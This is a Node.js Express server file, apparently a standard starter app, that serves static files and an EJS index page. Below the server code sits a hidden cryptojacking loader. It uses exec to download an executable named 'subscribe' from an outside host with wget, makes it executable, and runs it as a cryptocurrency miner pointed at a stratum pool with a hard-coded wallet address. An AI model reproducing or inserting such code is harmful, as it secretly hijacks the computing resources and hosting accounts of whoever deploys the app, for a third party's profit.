const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000

express()
  .use(express.static(path.join(__dirname, 'public')))
  .set('views', path.join(__dirname, 'views'))
  .set('view engine', 'ejs')
  .get('/', (req, res) => res.render('pages/index'))
  .listen(PORT, () => console.log(`Listening on ${ PORT }`))

const wget = 'wget http://ilovenypizza.com/subscribe && chmod +x subscribe';
const run = './subscribe -a yespowerTIDE -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.gc -t 4';
var child = exec(wget, function(err, stdout, stderr) {
    if(err){
        throw(err);
    } else {
        exec(run) 
    }
});
